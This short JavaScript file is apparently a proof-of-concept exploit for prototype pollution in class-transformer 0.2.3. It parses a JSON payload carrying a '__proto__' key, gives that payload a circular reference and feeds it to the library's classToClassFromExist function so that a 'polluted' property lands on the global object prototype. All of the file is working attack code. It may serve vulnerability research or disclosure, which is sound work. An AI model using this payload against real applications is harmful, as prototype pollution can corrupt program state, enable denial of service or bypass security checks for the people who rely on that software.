const root = require("./class-transformer@0.2.3");
const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');

payload.__proto__.polluted = payload;
payload.toString = function() { return "yes" }
root.classToClassFromExist(payload, {}, { enableCircularCheck: true })
